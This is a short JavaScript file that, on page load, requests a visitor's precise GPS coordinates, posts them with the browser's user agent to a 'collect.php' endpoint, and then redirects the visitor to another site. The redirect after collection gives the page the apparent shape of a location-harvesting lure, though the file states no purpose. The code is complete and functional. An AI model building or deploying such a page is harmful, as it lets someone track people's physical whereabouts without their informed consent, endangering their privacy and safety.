const statusText = document.getElementById("status");

function gpsLocation() {
    if (!navigator.geolocation) {
        statusText.textContent = "Location is not supported.";
        return;
    }

    navigator.geolocation.getCurrentPosition(
        async function (position) {
            const locationData = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                browser: navigator.userAgent
            };

            try {
                const response = await fetch("collect.php", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(locationData)
                });

                const result = await response.json();

                if (!response.ok || !result.success) {
                    throw new Error("Could not save location.");
                }

                window.location.replace("https://example.com");

            } catch (error) {
                statusText.textContent = error.message;
            }
        },

        function (error) {
            if (error.code === 1) {
                statusText.textContent = "Location permission denied.";
            } else {
                statusText.textContent = "Unable to get location.";
            }
        },

        {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
        }
    );
}

gpsLocation();
